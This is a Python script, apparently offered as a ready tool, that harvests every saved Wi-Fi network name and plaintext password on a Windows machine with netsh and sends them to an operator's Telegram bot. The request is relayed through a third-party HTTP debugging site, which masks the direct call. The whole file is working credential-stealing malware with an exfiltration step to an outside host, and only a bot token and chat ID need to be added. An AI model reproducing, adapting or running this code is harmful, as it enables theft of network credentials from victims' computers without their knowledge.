import subprocess
import requests
import re

# Enter Your Bot API Token Here(you can get this from @BotFather in telegram)

BOT_API_TOKEN = ''

# Enter Your Chat ID Here(you can get this from @raw_data_bot in telegram)

CHAT_ID = ''


# Checking If There Are Any Wifi Connections

netsh_output = subprocess.run(
    ["netsh", "wlan", "show", "profiles"], capture_output=True).stdout.decode()

profile_names = (re.findall("All User Profile     : (.*)\r", netsh_output))

wifi_list = []

# If Saved Wifi Connections Were More Than Zero It Will Grab The Wifi Keys

if len(profile_names) != 0:
    for name in profile_names:

        wifi_profile = {}

        profile_info = subprocess.run(
            ["netsh", "wlan", "show", "profile", name], capture_output=True).stdout.decode()
        if re.search("Security key           : Absent", profile_info):
            continue
        else:
            wifi_profile["ssid"] = name
            profile_info_pass = subprocess.run(
                ["netsh", "wlan", "show", "profile", name, "key=clear"], capture_output=True).stdout.decode()
            password = re.search(
                "Key Content            : (.*)\r", profile_info_pass)
            if password == None:
                wifi_profile["password"] = None
            else:
                wifi_profile["password"] = password[1]

            wifi_list.append(wifi_profile)


# Sending Data To Telegram Bot

for x in range(len(wifi_list)):
    print(wifi_list[x])
    url = (f"https://api.telegram.org/bot{BOT_API_TOKEN}/SendMessage?chat_id={CHAT_ID}&text=" + str(wifi_list[x]))
    payload = {"UrlBox":url, "AgentList":"Mozilla Firefox", "Methodlist":"POST"}
    requests.post("https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx",payload)

# @AMLDevelopment on telegram
# https://github.com/ItsAML